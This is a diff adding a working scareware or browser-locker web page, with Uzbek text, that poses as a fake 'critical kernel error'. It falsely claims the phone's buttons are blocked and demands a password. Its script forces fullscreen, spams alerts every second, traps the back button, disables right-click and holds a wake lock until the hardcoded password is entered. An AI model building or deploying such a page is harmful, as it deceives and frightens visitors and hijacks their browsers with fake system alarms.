@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="uz">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <title>CRITICAL SYSTEM ERROR</title>
+    <style>
+      body,
+      html {
+        margin: 0;
+        padding: 0;
+        width: 100%;
+        height: 100%;
+        background: #000
+          url("https://w0.peakpx.com/wallpaper/401/476/HD-wallpaper-matrix-code-binary-code-black-background-hacker-concepts-security-concepts-binary-data.jpg")
+          center/cover;
+        color: #0f0;
+        font-family: monospace;
+        overflow: hidden;
+        touch-action: none;
+      }
+      #screen {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        background: rgba(0, 0, 0, 0.92);
+        z-index: 100000;
+      }
+      .warning {
+        color: red;
+        font-size: 22px;
+        animation: blink 0.5s infinite;
+        font-weight: bold;
+      }
+      @keyframes blink {
+        0% {
+          opacity: 0;
+        }
+        50% {
+          opacity: 1;
+        }
+        100% {
+          opacity: 0;
+        }
+      }
+
+      input {
+        background: #111;
+        border: 2px solid #0f0;
+        color: #0f0;
+        padding: 15px;
+        font-size: 20px;
+        margin-top: 20px;
+        width: 80%;
+        text-align: center;
+        outline: none;
+      }
+      button {
+        background: #0f0;
+        color: #000;
+        border: none;
+        padding: 12px 45px;
+        font-weight: bold;
+        margin-top: 15px;
+        font-size: 18px;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body oncontextmenu="return false;">
+    <div id="screen">
+      <div class="warning">! CRITICAL KERNEL ERROR !</div>
+      <p style="text-align: center; padding: 20px; font-size: 14px">
+        Tizim xavfsizlik protokoli faollashdi. <br />
+        <b style="color: white"
+          >Barcha tashqi tugmalar (Home, Back, Power) bloklandi.</b
+        ><br /><br />
+        Qurilmani blokdan chiqarish uchun parolni kiriting:
+      </p>
+
+      <input type="password" id="key" placeholder="ADMIN PAROLI" />
+      <button onclick="check()">RESTORE ACCESS</button>
+
+      <p style="margin-top: 30px; font-size: 10px; color: #666">
+        ENCRYPTION KEY: AZIZYBAN-SEC-99
+      </p>
+    </div>
+
+    <script>
+      const PASS = "azizyban";
+      let isLocked = true;
+
+      // Fullscreen funksiyasi
+      function forceFull() {
+        if (!isLocked) return;
+        let doc = document.documentElement;
+        if (doc.requestFullscreen) doc.requestFullscreen();
+        else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
+      }
+
+      // 1. ALERT LOOP: Har 1 soniyada to'liq ekranni tekshiradi va spam qiladi
+      setInterval(function () {
+        if (
+          isLocked &&
+          !document.fullscreenElement &&
+          !document.webkitFullscreenElement
+        ) {
+          forceFull();
+          alert("DIQQAT: Tizim navigatsiyasi cheklandi! Parolni kiriting.");
+        }
+      }, 1000);
+
+      // Ekranga har qanday teginishda blokni yangilash
+      window.addEventListener("touchstart", forceFull);
+      window.addEventListener("click", forceFull);
+
+      // 2. BACK TUGMASI BLOKIROVKASI
+      window.history.pushState(null, null, window.location.href);
+      window.onpopstate = function () {
+        if (isLocked) {
+          window.history.go(1);
+          alert("Xatolik: Orqaga qaytish taqiqlangan!");
+        }
+      };
+
+      // 3. PAROL TEKSHIRISH
+      function check() {
+        let val = document.getElementById("key").value;
+        if (val === PASS) {
+          isLocked = false;
+          alert("Tizim muvaffaqiyatli tiklandi.");
+          if (document.exitFullscreen) document.exitFullscreen();
+          else if (document.webkitExitFullscreen)
+            document.webkitExitFullscreen();
+          window.location.href = "https://google.com";
+        } else {
+          alert("XATO PAROL! TIZIM XAVF OSTIDA.");
+          forceFull();
+        }
+      }
+
+      // Ekranni o'chib qolishdan saqlash
+      if ("wakeLock" in navigator) {
+        navigator.wakeLock.request("screen").catch(() => {});
+      }
+    </script>
+  </body>
+</html>
